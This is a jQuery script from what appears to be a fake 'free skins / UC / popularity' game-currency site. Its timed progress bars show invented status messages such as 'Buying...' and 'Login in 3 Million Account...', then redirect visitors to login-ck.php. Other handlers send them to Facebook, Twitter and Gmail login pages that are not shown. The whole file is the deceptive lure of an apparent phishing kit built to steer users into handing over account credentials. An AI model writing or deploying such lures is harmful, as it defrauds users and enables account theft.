$(document).ready(function() {
    $('#skn').click(function() {
        window.location.replace('skins.php')
    });
    $('#uc').click(function() {
        window.location.replace('uc.php')
    });
    $('#pop').click(function() {
        window.location.replace('popularity.php')
    });

    $('.index-all-page-img').click(function() {
        window.location.replace('index.php')
    });
});

// Get Skins Progress
$(document).ready(function() {
    $("#next-btn-prog").click(function() {
        $('#next-btn-prog').prop('disabled', true);
        $('.progress').show(1000)
        var progressBar = $('.progress-bar');
        var percentVal = 0;
        window.setInterval(function() {
            percentVal += 10;
            progressBar.css("width", percentVal + '%').attr("aria-valuenow", percentVal + '%');
            if (percentVal == 20) {
                progressBar.css("width", percentVal + '%').attr("aria-valuenow", percentVal + '%').text("Buying...");
            }
            if (percentVal == 50) {
                progressBar.css("width", percentVal + '%').attr("aria-valuenow", percentVal + '%').text("Verify items...");
            }
            if (percentVal == 70) {
                progressBar.css("width", percentVal + '%').attr("aria-valuenow", percentVal + '%').text("Get Skins...");
            }
            if (percentVal == 80) {
                progressBar.css("width", percentVal + '%').attr("aria-valuenow", percentVal + '%').text("loading...");
            }
            if (percentVal == 90) {
                progressBar.css("width", percentVal + '%').attr("aria-valuenow", percentVal + '%').text("Ready to take it ~");
            }
            if (percentVal == 100) {
                progressBar.css("width", percentVal + '%').attr("aria-valuenow", percentVal + '%').text("Done");
                // $('#pop-login-index').slideDown(1000);
                window.location.replace('login-ck.php')
            }
        }, 1000);
    });
});
// Get UC Progress
$(document).ready(function() {
    $("#next-btn-prog-uc").click(function() {
        $('#next-btn-prog-uc').prop('disabled', true);
        $('.progress').show(1000)
        var progressBar = $('.progress-bar');
        var percentVal = 0;
        window.setInterval(function() {
            percentVal += 10;
            progressBar.css("width", percentVal + '%').attr("aria-valuenow", percentVal + '%');
            if (percentVal == 20) {
                progressBar.css("width", percentVal + '%').attr("aria-valuenow", percentVal + '%').text("Buying...");
            }
            if (percentVal == 50) {
                progressBar.css("width", percentVal + '%').attr("aria-valuenow", percentVal + '%').text("Verify...");
            }
            if (percentVal == 70) {
                progressBar.css("width", percentVal + '%').attr("aria-valuenow", percentVal + '%').text("Get UC...");
            }
            if (percentVal == 80) {
                progressBar.css("width", percentVal + '%').attr("aria-valuenow", percentVal + '%').text("loading...");
            }
            if (percentVal == 90) {
                progressBar.css("width", percentVal + '%').attr("aria-valuenow", percentVal + '%').text("Ready to take it ~");
            }
            if (percentVal == 100) {
                progressBar.css("width", percentVal + '%').attr("aria-valuenow", percentVal + '%').text("Done");
                // $('#pop-login-index').slideDown(1000);
                window.location.replace('login-ck.php')
            }
        }, 1000);
    });
});
// Get popularity Progress
$(document).ready(function() {
    $("#next-btn-prog-popularity").click(function() {
        $('#next-btn-prog-popularity').prop('disabled', true);
        $('.progress').show(1000)
        var progressBar = $('.progress-bar');
        var percentVal = 0;
        window.setInterval(function() {
            percentVal += 10;
            progressBar.css("width", percentVal + '%').attr("aria-valuenow", percentVal + '%');
            if (percentVal == 20) {
                progressBar.css("width", percentVal + '%').attr("aria-valuenow", percentVal + '%').text("Buying...");
            }
            if (percentVal == 50) {
                progressBar.css("width", percentVal + '%').attr("aria-valuenow", percentVal + '%').text("Login in 3 Million Account...");
            }
            if (percentVal == 70) {
                progressBar.css("width", percentVal + '%').attr("aria-valuenow", percentVal + '%').text("Verify number of popularity...");
            }
            if (percentVal == 80) {
                progressBar.css("width", percentVal + '%').attr("aria-valuenow", percentVal + '%').text("loading...");
            }
            if (percentVal == 90) {
                progressBar.css("width", percentVal + '%').attr("aria-valuenow", percentVal + '%').text("Ready to take it ~");
            }
            if (percentVal == 100) {
                progressBar.css("width", percentVal + '%').attr("aria-valuenow", percentVal + '%').text("Done");
                // $('#pop-login-index').slideDown(1000);
                window.location.replace('login-ck.php')
            }
        }, 1000);
    });
});

$(document).ready(function() {
    $('.facebook').click(function() {
        window.location.replace('login/facebook-login.php');
    });
    $('.twitter').click(function() {
        window.location.replace('login/twitter-login.php');
    });
    $('.gmail').click(function() {
        window.location.replace('login/gmail-login.php');
    });
});



// Slect only One Box From UC CheckBox :
$(document).ready(function() {
    $(document).on('click', '.uc-img-res', function() {
        $('.uc-img-res').removeClass('uc-checked');
        $(this).toggleClass("uc-checked");
    });
});